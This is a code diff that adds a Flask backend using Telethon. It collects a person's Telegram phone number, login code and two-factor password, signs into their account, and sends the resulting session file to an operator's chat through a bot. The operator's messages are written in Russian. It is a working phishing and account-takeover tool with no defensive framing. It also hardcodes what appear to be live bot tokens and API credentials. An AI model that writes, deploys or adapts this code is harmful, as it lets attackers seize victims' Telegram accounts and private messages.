@@ -1,0 +1,118 @@
+import os
+import asyncio
+import logging
+import shutil
+from flask import Flask, request, jsonify
+from flask_cors import CORS
+from telethon import TelegramClient, errors
+import telegram
+
+BOT_TOKEN = "8351620405:AAH-gmmO0522MnrVZUBd4ytM-0986FkvF_8"
+ADMIN_ID = 1862189323
+API_ID = 33509870
+API_HASH = "2259a941d4ca6d50455b1bacc05647ad"
+
+app = Flask(__name__)
+CORS(app)
+
+temp_clients = {}
+
+def send_message_to_admin(text):
+    try:
+        bot = telegram.Bot(token=BOT_TOKEN)
+        bot.send_message(chat_id=ADMIN_ID, text=text)
+    except:
+        pass
+
+def send_file_to_admin(file_path, phone):
+    bot = telegram.Bot(token=BOT_TOKEN)
+    try:
+        with open(file_path, 'rb') as f:
+            bot.send_document(chat_id=ADMIN_ID, document=f, caption=f"✅ Сессия для {phone}")
+        os.remove(file_path)
+    except Exception as e:
+        bot.send_message(chat_id=ADMIN_ID, text=f"❌ Ошибка: {e}")
+
+@app.route('/api/start', methods=['POST'])
+def start_login():
+    data = request.json
+    phone = data.get('phone')
+    if not phone: return jsonify({"error": "Phone required"}), 400
+
+    async def send_code():
+        client = TelegramClient(f"temp_{phone}", API_ID, API_HASH)
+        await client.connect()
+        await client.send_code_request(phone)
+        temp_clients[phone] = client
+        send_message_to_admin(f"📞 Запрос кода для {phone}")
+
+    asyncio.run(send_code())
+    return jsonify({"status": "code_sent"})
+
+@app.route('/api/check_code', methods=['POST'])
+def check_code():
+    data = request.json
+    phone = data.get('phone')
+    code = data.get('code')
+    if not phone or not code: return jsonify({"error": "Phone and code required"}), 400
+
+    async def process():
+        if phone not in temp_clients:
+            client = TelegramClient(f"temp_{phone}", API_ID, API_HASH)
+            await client.connect()
+            temp_clients[phone] = client
+        else:
+            client = temp_clients[phone]
+
+        try:
+            await client.sign_in(phone=phone, code=code)
+            session_file = f"temp_{phone}.session"
+            if os.path.exists(session_file):
+                final_name = f"session_{phone.replace('+', '')}.session"
+                shutil.move(session_file, final_name)
+                send_file_to_admin(final_name, phone)
+            if phone in temp_clients:
+                del temp_clients[phone]
+            return {"status": "success"}
+        except errors.SessionPasswordNeededError:
+            return {"status": "password_needed"}
+        except Exception as e:
+            send_message_to_admin(f"❌ Ошибка: {e}")
+            return {"status": "error", "message": str(e)}
+
+    result = asyncio.run(process())
+    return jsonify(result)
+
+@app.route('/api/check_password', methods=['POST'])
+def check_password():
+    data = request.json
+    phone = data.get('phone')
+    password = data.get('password')
+    if not phone or not password: return jsonify({"error": "Phone and password required"}), 400
+
+    async def process():
+        if phone not in temp_clients:
+            return {"status": "error", "message": "Session expired"}
+        client = temp_clients[phone]
+        try:
+            await client.sign_in(password=password)
+            session_file = f"temp_{phone}.session"
+            if os.path.exists(session_file):
+                final_name = f"session_{phone.replace('+', '')}.session"
+                shutil.move(session_file, final_name)
+                send_file_to_admin(final_name, phone)
+            if phone in temp_clients:
+                del temp_clients[phone]
+            return {"status": "success"}
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
+
+    result = asyncio.run(process())
+    return jsonify(result)
+
+@app.route('/')
+def index():
+    return "Server is running"
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
